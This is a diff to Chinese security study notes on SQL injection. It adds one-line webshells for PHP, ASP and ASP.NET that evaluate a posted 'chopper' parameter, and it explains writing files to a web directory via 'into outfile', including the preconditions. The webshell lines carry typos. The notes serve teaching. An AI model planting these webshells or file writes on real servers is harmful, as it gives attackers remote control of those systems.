@@ -361,3 +361,25 @@ text LIKE '%{$_ GET['search']}%'"
 
 **有些时候,后台开发人员为了验证客户端头信息(比如常用的cookie验证)<BR>或者通过http header头信息获取客户端的一些信息,比如useragent、accept字段等等。会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于http header的SQL Inject漏洞。**
 
+## <font color = #1E90FF>SQL注入OS远程控制</font>
+### <font color=#FF0000>一句话木马</font>
+**一句话木马是一种短小而精悍的木马客户端 ,隐蔽性好,且功能强大。**
+
+```
+PHP: <?php @eval($_ POST'chopper']);?>
+ASP: < %eval request(" chopper")%>
+ASP.NET: <%@ Page Language=" Jscript" %> < %eval(Request.Item[" chopper"],"unsafe'");%>
+```
+
+### <font color=#FF0000>写入</font>
+**into outfile将select的结果写入到指定目录的1.txt中<BR>在一些没有回显的注入中可以使用into outfile将结果写入到指定文件,然后访问获取**
+
+#### 前提条件:
+
+- **1.需要知道远程目录**
+- **2.需要远程目录有写权限**
+- **3.需要数据库开启了secure_file_priv**
+
+## <font color = #1E90FF>RCE</font>
+
+
